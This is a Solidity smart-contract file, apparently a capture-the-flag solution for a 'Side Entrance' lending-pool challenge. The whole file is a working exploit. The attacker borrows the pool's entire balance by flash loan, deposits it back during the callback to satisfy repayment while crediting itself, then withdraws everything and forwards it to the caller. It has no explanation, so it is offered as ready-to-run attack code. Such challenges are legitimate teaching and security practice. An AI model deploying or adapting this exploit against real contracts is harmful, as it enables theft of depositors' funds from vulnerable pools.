pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {
    using Address for address payable;
    address lender;

    function attack(address _lender) public {
        lender = _lender;
        uint256 amount = _lender.balance;
        ISideEntranceLenderPool(_lender).flashLoan(amount);
        ISideEntranceLenderPool(_lender).withdraw();
        msg.sender.sendValue(amount);
    }

    function execute() external payable {
        ISideEntranceLenderPool(lender).deposit{value: msg.value}();
    }

    receive() external payable {}
}
